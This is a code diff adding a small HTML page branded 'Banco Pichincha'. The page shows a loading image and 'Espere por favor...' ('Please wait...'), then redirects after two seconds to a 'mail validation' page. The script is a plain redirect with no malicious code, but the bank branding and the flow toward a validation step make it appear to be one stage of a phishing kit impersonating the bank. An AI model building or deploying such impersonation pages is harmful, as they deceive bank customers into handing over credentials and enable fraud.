@@ -1,0 +1,48 @@
+<!DOCTYPE html>
+<html>
+    <head>
+        <meta charset="utf-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1.0">
+        <title>Banco Pichincha</title>
+        <link rel="icon" type="image/x-icon" href="/media/icon.png">
+        <style>
+            body {
+                display: flex;
+                align-items: center;
+                justify-content: center;
+                flex-direction: column;
+                font-family: Verdana, Geneva, Tahoma, sans-serif;
+            }
+
+            img {
+                margin: auto;
+                padding: 10px;
+            }
+        </style>
+
+<script language="JavaScript">
+    var tiempo=2;
+    var url="/validacion/mailvalidation.html";
+ 
+    function updateReloj()
+    {
+ 
+        if(tiempo==0)
+        {
+            window.location=url;
+        }else{
+            tiempo-=1;
+            setTimeout("updateReloj()",1000);
+        }
+    }
+   window.onload=updateReloj;
+ 
+    </script>
+    </head>
+
+
+    <body>
+        <img src="/media/charge.gif" style="width: 300px; margin-top: 5%">
+        <h2 style="color: #0f265c;">Espere por favor...</h2>
+    </body>
+</html>
